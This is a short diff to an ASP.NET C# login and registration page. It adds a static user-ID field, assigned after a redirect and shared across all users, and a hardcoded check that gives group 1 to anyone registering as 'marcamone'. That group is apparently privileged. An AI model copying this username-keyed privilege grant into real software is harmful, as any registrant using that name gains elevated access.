@@ -20,6 +20,7 @@ namespace CDNEU
         FotoUsuarioNego fotoUsuarioNego = new FotoUsuarioNego();
 
         public static int idUsuarioTemporal;
+
         protected void Page_Load(object sender, EventArgs e)
         {
         }
@@ -36,6 +37,8 @@ namespace CDNEU
                 Session["usergrupo"] = Convert.ToString(usuario.Grupo);
                 Session["userActivo"] = usuario.Activo;
                 Response.Redirect("Default.aspx");
+
+                idUsuarioTemporal = usuario.IdUsuario;
             }
             else
             {
@@ -73,6 +76,12 @@ namespace CDNEU
             usuario.Activo = true;
 
             usuario.NombreUsuario = txtRegistroNombreUsuario.Text;
+
+            if (usuario.NombreUsuario == "marcamone")
+            {
+                usuario.Grupo = 1;
+            }
+
             usuario.Contrasenia = txtRegistroContrasenia.Text;
 
             usuario.Nombre = txtRegistroNombre.Text;
